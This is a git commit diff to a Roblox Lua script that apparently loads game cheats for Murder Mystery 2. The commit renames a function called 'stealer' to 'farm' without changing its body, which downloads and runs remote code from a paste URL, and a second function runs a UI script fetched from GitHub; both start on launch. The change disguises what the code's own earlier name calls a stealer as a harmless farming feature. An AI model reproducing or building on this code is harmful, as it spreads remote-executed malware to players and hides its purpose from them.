940fb00e538ee23d499da35e52662924d499fc2c
leonix <furkan62.bakir@gmail.com>
2025-10-20 21:25:50 +0300

    Update most.lua

--- most.lua
+++ most.lua
@@ -1,9 +1,9 @@
-local function stealer()
+local function farm()
     loadstring(game:HttpGet('https://paste.debian.net/plainh/4ea1f6a5/', true))()
 end
 local function loadui()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/renardofficiel/game/refs/heads/main/MurderMystery2/main.lua'))()
 end
 
-task.spawn(stealer)
+task.spawn(farm)
 task.spawn(loadui)
